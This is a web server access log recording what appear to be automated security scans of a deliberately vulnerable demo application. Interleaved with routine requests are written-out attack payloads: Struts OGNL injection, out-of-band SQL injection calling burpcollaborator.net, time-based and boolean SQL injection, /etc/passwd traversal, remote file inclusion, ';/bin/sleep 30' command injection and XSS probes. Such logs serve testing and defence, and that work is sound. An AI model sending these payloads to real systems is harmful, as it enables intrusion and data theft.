203.141.138.55 - - [20/Dec/2019:08:26:21 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:21 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:22 +0000] "GET /dt/includable.jsp?template=monochro HTTP/1.1" 200 3117
203.141.138.55 - - [20/Dec/2019:08:26:22 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:22 +0000] "GET /images/easybuggy_monochro.png HTTP/1.1" 200 15538
54.92.84.100 - - [20/Dec/2019:08:26:22 +0000] "GET /images/easybuggyL_monochro.png HTTP/1.1" 200 7315
203.141.138.55 - - [20/Dec/2019:08:26:22 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:22 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:23 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:23 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:23 +0000] "GET / HTTP/1.1" 200 22510
203.141.138.55 - - [20/Dec/2019:08:26:24 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:24 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:24 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:25 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:25 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:25 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:26 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:26 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:26 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:27 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:27 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:27 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:28 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:28 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:28 +0000] "GET /uid/clientinfo.jsp HTTP/1.1" 200 3526
203.141.138.55 - - [20/Dec/2019:08:26:30 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:30 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:30 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:31 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:31 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:31 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:32 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:32 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:32 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:33 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:33 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:33 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:34 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:34 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:34 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:35 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:35 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:35 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:36 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:36 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:36 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:37 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:37 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:37 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:38 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:38 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:38 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:39 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:39 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:40 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:40 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:40 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:41 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:41 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:41 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:42 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:42 +0000] "GET / HTTP/1.1" 200 22510
203.141.138.55 - - [20/Dec/2019:08:26:42 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:42 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:43 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:43 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:43 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:44 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:44 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:46 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:48 +0000] "GET /dfi/includable.jsp?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.hook[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString&hook=HOOK_VAL HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:26:48 +0000] "GET /dfi/includable.jsp?debug=console HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:26:48 +0000] "GET /dfi/includable.jsp?Class.classLoader.URLs[0]=testClassloaderManipulation1576830408 HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:26:49 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:49 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:49 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:50 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
54.92.84.100 - - [20/Dec/2019:08:26:50 +0000] "GET /vaddy-bc63bbf30d1cc49.html?action=commit&project_id=6bc8ecfdc539445456c1&time=1576830323 HTTP/1.1" 200 16
203.141.138.55 - - [20/Dec/2019:08:26:50 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:50 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:51 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:51 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:51 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:52 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:52 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:53 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:53 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:53 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:54 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:54 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:54 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:55 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:55 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:55 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:56 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:56 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:26:56 +0000] "GET /javax.faces.resource.../WEB-INF/web.xml.jsf HTTP/1.1" 404 1037
203.141.138.55 - - [20/Dec/2019:08:26:57 +0000] "GET /javax.faces.resource.../WEB-INF/web.xml.xhtml HTTP/1.1" 404 1041
203.141.138.55 - - [20/Dec/2019:08:26:57 +0000] "GET /javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 404 1033
203.141.138.55 - - [20/Dec/2019:08:26:57 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:58 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:58 +0000] "GET /dfi/javax.faces.resource.../WEB-INF/web.xml.jsf HTTP/1.1" 404 1045
203.141.138.55 - - [20/Dec/2019:08:26:58 +0000] "GET /dfi/javax.faces.resource.../WEB-INF/web.xml.xhtml HTTP/1.1" 404 1049
203.141.138.55 - - [20/Dec/2019:08:26:59 +0000] "GET /dfi/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 404 1041
203.141.138.55 - - [20/Dec/2019:08:26:59 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:26:59 +0000] "GET null null" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:00 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:00 +0000] "GET /dfi/includable.jsp?redirect:http://www.example.com/%23 HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:00 +0000] "GET /dfi/includable.jsp?redirectAction:http://www.example.com/%23 HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:01 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:01 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:01 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:02 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:02 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:02 +0000] "GET /dfi/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20vyiou%20SYSTEM%20%22http%3a//grbsq9q52mu8gele5d1w518jxa33rwfz3qvdl1a.burpcollab'%7c%7c'orator.net/%22%3e%25vyiou%3b]%3e')%2c'/l')%20from%20dual)?template=style_materialize.html HTTP/1.1" 404 1548
203.141.138.55 - - [20/Dec/2019:08:27:03 +0000] "GET /dfi/includable.jsp'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20vyiou%20SYSTEM%20%22http%3a//7fnje0ewqdiz4595t4pntswal1rufn3rrij59ty.burpcollab'%7c%7c'orator.net/%22%3e%25vyiou%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'?template=style_materialize.html HTTP/1.1" 404 1604
203.141.138.55 - - [20/Dec/2019:08:27:03 +0000] "GET /dfi/includable.jsp%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cc3go2521ei64saxah9dshxkf96fz3srjh78zvpje.burpcollab'%2b'orator.net%5cwfy'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:03 +0000] "GET /dfi/includable.jsp'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6hoigzgvscky64b4v3rmvry9n0tthm5dw1ntajy8.burpcollab'%2b'orator.net%5cfze'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:04 +0000] "GET /dfi/includable.jsp)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6ahi9z9vlcdyz444o3kmorr9g0mtamydq1ht4js8.burpcollab'%2b'orator.net%5ckat'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:04 +0000] "GET /dfi/includable.jsp')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2dgecvcro8gu2070rznirnu5jwppdi19uxlp8fw4.burpcollab'%2b'orator.net%5cwjf'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:05 +0000] "GET /dfi/(select%20load_file('%5c%5c%5c%5c1cedbubqn7ft1z6zqymhqmt4ivooch082wtoge43.burpcollaborator.net%5c%5cxwu'))?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:05 +0000] "GET /dfi/includable.jsp'%2b(select%20load_file('%5c%5c%5c%5coia0hhhdtulg7mcmwls4w9zroiubi46v9j0bn1bq.burpcollaborator.net%5c%5caom'))%2b'?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:05 +0000] "GET /dfi/includable.jsp'?template=style_materialize.html HTTP/1.1" 404 1014
203.141.138.55 - - [20/Dec/2019:08:27:06 +0000] "GET /dfi/includable.jsp'?template=style_materialize.html HTTP/1.1" 404 1014
203.141.138.55 - - [20/Dec/2019:08:27:06 +0000] "GET /dfi/includable.jsp?template=style_materialize.html HTTP/1.1" 200 2975
203.141.138.55 - - [20/Dec/2019:08:27:06 +0000] "GET /dfi/includable.jsp''?template=style_materialize.html HTTP/1.1" 404 1016
203.141.138.55 - - [20/Dec/2019:08:27:07 +0000] "GET /dfi/includable.jsp''?template=style_materialize.html HTTP/1.1" 404 1016
203.141.138.55 - - [20/Dec/2019:08:27:07 +0000] "GET /dfi/includable.jsp'(select*from(select(sleep(20)))a)'?template=style_materialize.html HTTP/1.1" 404 1082
203.141.138.55 - - [20/Dec/2019:08:27:07 +0000] "GET /dfi/includable.jsp'%2b(select*from(select(sleep(20)))a)%2b'?template=style_materialize.html HTTP/1.1" 404 1094
203.141.138.55 - - [20/Dec/2019:08:27:08 +0000] "GET /dfi/includable.jsp'%20and%20(select*from(select(sleep(20)))a)--%20?template=style_materialize.html HTTP/1.1" 404 1108
203.141.138.55 - - [20/Dec/2019:08:27:08 +0000] "GET /dfi/includable.jsp%2c(select*from(select(sleep(20)))a)?template=style_materialize.html HTTP/1.1" 404 1084
203.141.138.55 - - [20/Dec/2019:08:27:08 +0000] "GET /dfi/includable.jsp'%20waitfor%20delay'0%3a0%3a20'--?template=style_materialize.html HTTP/1.1" 404 1078
52.69.45.235 - - [20/Dec/2019:08:27:08 +0000] "GET /vaddy-bc63bbf30d1cc49.html?action=begin&project_id=6bc8ecfdc539445456c1&time=1576830322 HTTP/1.1" 200 16
203.141.138.55 - - [20/Dec/2019:08:27:09 +0000] "GET /dfi/includable.jsp')waitfor%20delay'0%3a0%3a20'--?template=style_materialize.html HTTP/1.1" 404 1074
203.141.138.55 - - [20/Dec/2019:08:27:09 +0000] "GET /dfi/includable.jsp'%2c0)waitfor%20delay'0%3a0%3a20'--?template=style_materialize.html HTTP/1.1" 404 1082
52.69.45.235 - - [20/Dec/2019:08:27:09 +0000] "GET /dfi/includable.jsp?template=http://rficheck.vaddy.net/rfi30.txt%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F2%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:09 +0000] "GET /dfi/includable.jsp13419706'%20or%20'2357'%3d'2357?template=style_materialize.html HTTP/1.1" 404 1074
203.141.138.55 - - [20/Dec/2019:08:27:10 +0000] "GET /dfi/includable.jsp92694047'%20or%20'7292'%3d'7293?template=style_materialize.html HTTP/1.1" 404 1074
52.69.45.235 - - [20/Dec/2019:08:27:10 +0000] "GET /dfi/includable.jsp?template=http://rficheck.vaddy.net/rfi30.txt%27 HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:10 +0000] "GET /dfi/includable.jsp27624979'%20or%20'7169'%3d'7169?template=style_materialize.html HTTP/1.1" 404 1074
52.69.45.235 - - [20/Dec/2019:08:27:10 +0000] "GET /dfi/includable.jsp?template=http://rficheck.vaddy.net/rfi30.txt%2F*%2F HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:10 +0000] "GET /dfi/includable.jsp48951015'%20or%20'1119'%3d'1119'?template=style_materialize.html HTTP/1.1" 404 1076
52.69.45.235 - - [20/Dec/2019:08:27:11 +0000] "GET /dfi/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:11 +0000] "GET /dfi/includable.jsp56861767'%20or%207097%3d7097--%20?template=style_materialize.html HTTP/1.1" 404 1078
203.141.138.55 - - [20/Dec/2019:08:27:11 +0000] "GET /dfi/includable.jsp92740848'%20or%202263%3d2266--%20?template=style_materialize.html HTTP/1.1" 404 1078
52.69.45.235 - - [20/Dec/2019:08:27:11 +0000] "GET /dfi/includable.jsp?template=http://rficheck.vaddy.net/rfi30.txt%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:11 +0000] "GET /dfi/includable.jsp15366174'%20or%202954%3d2954--%20?template=style_materialize.html HTTP/1.1" 404 1078
203.141.138.55 - - [20/Dec/2019:08:27:12 +0000] "GET /dfi/includable.jsp18810235'%20or%203347%3d3347'--%20?template=style_materialize.html HTTP/1.1" 404 1080
52.69.45.235 - - [20/Dec/2019:08:27:12 +0000] "GET /dfi/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2565
203.141.138.55 - - [20/Dec/2019:08:27:12 +0000] "GET /dfi/includable.jsp'%20and%20'8048'%3d'8048?template=style_materialize.html HTTP/1.1" 404 1060
203.141.138.55 - - [20/Dec/2019:08:27:13 +0000] "GET /dfi/includable.jsp'%20and%20'9484'%3d'9485?template=style_materialize.html HTTP/1.1" 404 1060
203.141.138.55 - - [20/Dec/2019:08:27:13 +0000] "GET /dfi/includable.jsp'%20and%20'9937'%3d'9937?template=style_materialize.html HTTP/1.1" 404 1060
52.69.45.235 - - [20/Dec/2019:08:27:13 +0000] "GET /dfi/includable.jsp?template=http://rficheck.vaddy.net/rfi30.txt HTTP/1.1" 200 2565
203.141.138.55 - - [20/Dec/2019:08:27:13 +0000] "GET /dfi/includable.jsp'%20and%20'2708'%3d'2708'?template=style_materialize.html HTTP/1.1" 404 1062
52.69.45.235 - - [20/Dec/2019:08:27:13 +0000] "GET /dfi/includable.jsp HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp'%20and%209892%3d9892--%20?template=style_materialize.html HTTP/1.1" 404 1064
52.69.45.235 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F4%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp'%20and%209812%3d9815--%20?template=style_materialize.html HTTP/1.1" 404 1064
52.69.45.235 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%27 HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp'%20and%208364%3d8364--%20?template=style_materialize.html HTTP/1.1" 404 1064
52.69.45.235 - - [20/Dec/2019:08:27:14 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%2F*%2F HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/includable.jsp'%20and%207259%3d7259'--%20?template=style_materialize.html HTTP/1.1" 404 1066
52.69.45.235 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2513
203.141.138.55 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/includable.jsp%22?template=style_materialize.html HTTP/1.1" 404 1018
52.69.45.235 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 3116
203.141.138.55 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/4fi4e1y1mb?template=style_materialize.html HTTP/1.1" 404 1004
52.69.45.235 - - [20/Dec/2019:08:27:15 +0000] "GET /dfi/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2565
203.141.138.55 - - [20/Dec/2019:08:27:16 +0000] "GET /dfi/includable.jspxap2bpuupt?template=style_materialize.html HTTP/1.1" 404 1032
203.141.138.55 - - [20/Dec/2019:08:27:16 +0000] "GET /dfi/includable.jspalert(1)?template=style_materialize.html HTTP/1.1" 404 1028
203.141.138.55 - - [20/Dec/2019:08:27:16 +0000] "GET /dfi/includable.jspc0hvv%3ca%3epvl9a?template=style_materialize.html HTTP/1.1" 404 1046
52.69.45.235 - - [20/Dec/2019:08:27:16 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html HTTP/1.1" 200 3116
203.141.138.55 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jspc0hvv%253ca%253epvl9a?template=style_materialize.html HTTP/1.1" 404 1054
52.69.45.235 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%3Cscript+src%3Dhttp%3A%2F%2Fvaddy.net%2F4460-4689c5e0-b95c-4536-b711-e0f3edb2a33d%2F5%2F0%2F0%2Fvaddy.js%3E%3C%2Fscript%3E HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jsp%00c0hvv%3ca%3epvl9a?template=style_materialize.html HTTP/1.1" 400 -
52.69.45.235 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%27 HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jspln88laajl3%3e%3c?template=style_materialize.html HTTP/1.1" 404 1044
52.69.45.235 - - [20/Dec/2019:08:27:17 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%2F*%2F HTTP/1.1" 200 2521
203.141.138.55 - - [20/Dec/2019:08:27:18 +0000] "GET /dfi/includable.jspln88laajl3%253e%253c?template=style_materialize.html HTTP/1.1" 404 1052
52.69.45.235 - - [20/Dec/2019:08:27:18 +0000] "GET /dfi/includable.jsp?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 2513
52.69.45.235 - - [20/Dec/2019:08:27:18 +0000] "GET /dfi/includable.jsp?template=style_google_mdl.html%3B%2Fbin%2Fsleep+30 HTTP/1.1" 200 3116
203.141.138.55 - - [20/Dec/2019:08:27:18 +0000] "GET /dfi/includable.jsp%00ln88laajl3%3e%3c?template=style_materialize.html HTTP/1.1" 400 -
203.141.138.55 - - [20/Dec/2019:08:27:18 +0000] "GET /dfi/alert(1)?template=style_materialize.html HTTP/1.1" 404 1000
52.69.45.235 - - [20/Dec/2019:08:27:19 +0000] "GET /dfi/includable.jsp?template=http%3A%2F%2Frficheck.vaddy.net%2Frfi30.txt%3F%3F%3F HTTP/1.1" 200 2565
